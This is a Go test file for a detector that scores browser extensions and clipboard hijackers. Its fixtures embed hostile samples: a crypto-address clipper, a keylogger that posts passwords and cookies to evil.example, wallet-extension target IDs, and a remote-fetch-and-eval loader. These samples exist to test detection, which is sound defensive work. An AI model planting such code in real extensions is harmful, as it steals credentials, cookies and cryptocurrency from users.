package detect

import (
	"context"
	"encoding/json"
	"os"
	"path/filepath"
	"testing"

	"detector/internal/config"
	"detector/internal/db"
)

func TestClipperCodeIndicator(t *testing.T) {
	dir := t.TempDir()
	clipper := filepath.Join(dir, "content.js")
	_ = os.WriteFile(clipper, []byte(`document.addEventListener("copy", e => {
  const t = getSelection().toString();
  if (/^0x[a-fA-F0-9]{40}$/.test(t)) { e.clipboardData.setData("text/plain", ATTACKER); e.preventDefault(); }
});`), 0o644)
	benign := filepath.Join(dir, "benign.js")
	_ = os.WriteFile(benign, []byte(`document.addEventListener("copy", () => track("copy"));`), 0o644)

	if got := clipperCodeIndicator([]string{benign}); got != "" {
		t.Errorf("benign script flagged: %s", got)
	}
	if got := clipperCodeIndicator([]string{benign, clipper}); got == "" {
		t.Error("clipper content script not detected")
	}
}

func TestClipperFileIndicator(t *testing.T) {
	dir := t.TempDir()
	p := filepath.Join(dir, "agent.sh")
	_ = os.WriteFile(p, []byte("c=$(pbpaste); [[ $c =~ ^0x[a-fA-F0-9]{40}$ ]] && echo x | pbcopy"), 0o644)
	if clipperFileIndicator([]string{p}) == "" {
		t.Error("shell clipper not detected")
	}
	q := filepath.Join(dir, "backup.sh")
	_ = os.WriteFile(q, []byte("pbpaste > /tmp/clip.txt"), 0o644)
	if got := clipperFileIndicator([]string{q}); got != "" {
		t.Errorf("clipboard-only script flagged: %s", got)
	}
}

// writeExt creates <profile>/Extensions/<id>/<ver>/ (or an absolute dir) with
// a manifest and one script, returning the directory.
func writeExt(t *testing.T, dir string, manifest, script string) string {
	t.Helper()
	if err := os.MkdirAll(dir, 0o755); err != nil {
		t.Fatal(err)
	}
	_ = os.WriteFile(filepath.Join(dir, "manifest.json"), []byte(manifest), 0o644)
	_ = os.WriteFile(filepath.Join(dir, "content.js"), []byte(script), 0o644)
	return dir
}

const (
	keyloggerJS = `document.addEventListener("keydown", e => buf.push(e.key));
document.querySelectorAll('input[type=password]').forEach(i => i.addEventListener("change", () => fetch("https://evil.example/k", {method:"POST", body: i.value})));
chrome.cookies.getAll({}, c => fetch("https://evil.example/c", {method:"POST", body: JSON.stringify(c)}));
const targets = ["nkbihfbeogaeaoehlefnkodbefgpgknn", "bfnaelmomeimhlpmgjnjophhpkkoljpa"];`
	remoteEvalJS = `fetch("https://cdn.evil.example/p.txt").then(r => r.text()).then(eval);`
	benignJS     = `console.log("hello");`
)

func TestScanChromiumRiskLevels(t *testing.T) {
	base := t.TempDir()
	prof := filepath.Join(base, "Default")
	ext := func(id, ver string) string { return filepath.Join(prof, "Extensions", id, ver) }

	writeExt(t, ext("aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa", "1.0_0"),
		`{"name":"Clean Notes","version":"1.0","manifest_version":3,"permissions":["storage"]}`, benignJS)
	writeExt(t, ext("bbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb", "2.0_0"),
		`{"name":"Removed Coupon","version":"2.0","manifest_version":3,"permissions":["storage"]}`, benignJS)
	writeExt(t, ext("cccccccccccccccccccccccccccccccc", "3.1_0"),
		`{"name":"Tampered","version":"3.1","manifest_version":3}`, benignJS)
	unpacked := writeExt(t, filepath.Join(base, "dropped", "ext"),
		`{"name":"PDF Helper","version":"0.1","manifest_version":3,"permissions":["cookies","scripting"],"host_permissions":["<all_urls>"],
		  "content_scripts":[{"matches":["<all_urls>"],"js":["content.js"],"run_at":"document_start","all_frames":true}]}`, keyloggerJS)
	cmdline := writeExt(t, filepath.Join(base, "loader"),
		`{"name":"Search Plus","version":"1.0","manifest_version":3,"chrome_settings_overrides":{"search_provider":{"name":"x"}},
		  "update_url":"https://updates.evil.example/crx"}`, remoteEvalJS)

	prefs := map[string]any{"extensions": map[string]any{"settings": map[string]any{
		"aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa": map[string]any{"location": 1, "from_webstore": true, "path": "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa/1.0_0",
			"cws-info": map[string]any{"is-live": true, "is-present": true, "violation-type": 0}},
		"bbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb": map[string]any{"location": 1, "from_webstore": true, "path": "bbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb/2.0_0",
			"cws-info": map[string]any{"is-live": false, "is-present": true, "violation-type": 1}},
		"cccccccccccccccccccccccccccccccc": map[string]any{"location": 1, "from_webstore": true, "path": "cccccccccccccccccccccccccccccccc/3.1_0",
			"disable_reasons": []int{512}},
		"dddddddddddddddddddddddddddddddd": map[string]any{"location": 4, "from_webstore": false, "path": unpacked},
		"eeeeeeeeeeeeeeeeeeeeeeeeeeeeeeee": map[string]any{"location": 8, "from_webstore": false, "path": cmdline},
		"ffffffffffffffffffffffffffffffff": map[string]any{"location": 5, "path": "/Applications/Chrome.app/component"},
	}}}
	raw, _ := json.Marshal(prefs)
	_ = os.WriteFile(filepath.Join(prof, "Secure Preferences"), raw, 0o644)
	_ = os.WriteFile(filepath.Join(prof, "Preferences"), []byte(`{}`), 0o644)

	got := map[string]browserExt{}
	for _, e := range scanChromium("Chrome", base) {
		got[e.Name] = e
	}
	if _, ok := got[""]; ok || len(got) != 5 {
		t.Fatalf("expected 5 non-component extensions, got %d: %v", len(got), got)
	}
	want := map[string]string{
		"Clean Notes":    SevLow,
		"Removed Coupon": SevCritical, // web store violation + removed
		"Tampered":       SevHigh,     // Chrome integrity failure
		"PDF Helper":     SevCritical, // unpacked keylogger + cookie exfil + wallet targets
		"Search Plus":    SevCritical, // --load-extension + self-hosted update + remote eval
	}
	for name, lvl := range want {
		e := got[name]
		if e.Risk.Level != lvl {
			t.Errorf("%s: level %s (score %d, signal %d, cap %d) want %s\n%s", name, e.Risk.Level, e.Risk.Score, e.Risk.Signal, e.Risk.Capability, lvl, e.Risk.summary(10))
		}
	}
	if got["Tampered"].Enabled {
		t.Error("extension with disable_reasons must be reported disabled")
	}
}

func TestExtensionUpdateEscalation(t *testing.T) {
	ctx := context.Background()
	database, err := db.Open(ctx, config.DatabaseConfig{DBType: "sqlite3", FilePath: filepath.Join(t.TempDir(), "t.db")})
	if err != nil {
		t.Fatal(err)
	}
	defer database.Close()
	env := &Env{State: &State{db: database, detector: "extensions"}, Host: "test"}

	mk := func(ver string, perms []any, code []riskReason) browserExt {
		mf := extManifest{Name: "Helper", Version: ver, Permissions: perms}
		e := browserExt{Browser: "Chrome", Profile: "Default", ID: "abc", Name: "Helper", Version: ver, Manifest: mf, Enabled: true}
		e.Perms, e.AllSites = manifestPerms(&mf)
		e.Risk = assessExtension(&mf, extInstall{Location: locInternal}, code)
		return e
	}
	current := []browserExt{mk("1.0", []any{"storage"}, nil)}
	d := newExtensionsDetector(config.ExtensionsDetectConfig{}).(*extensionsDetector)
	d.scan = func(context.Context) []browserExt { return current }
	d.sources = func(context.Context) []extSource { return nil }

	if rep, err := d.Check(ctx, env); err != nil || len(rep.Findings) != 0 {
		t.Fatalf("baseline: %v %+v", err, rep.Findings)
	}
	// malicious update: new permissions + stealer code
	current = []browserExt{mk("1.1", []any{"storage", "cookies", "<all_urls>"},
		[]riskReason{{"code_cookie_exfil", 20, "쿠키 일괄 수집 + 네트워크 전송 코드", kindSignal}})}
	rep, err := d.Check(ctx, env)
	if err != nil {
		t.Fatal(err)
	}
	rules := map[string]bool{}
	for _, f := range rep.Findings {
		rules[f.Rule] = true
	}
	if !rules["browser.ext_perm_escalation"] || !rules["browser.ext_new_verdict"] {
		t.Fatalf("expected escalation + new verdict findings, got %+v", rep.Findings)
	}
}
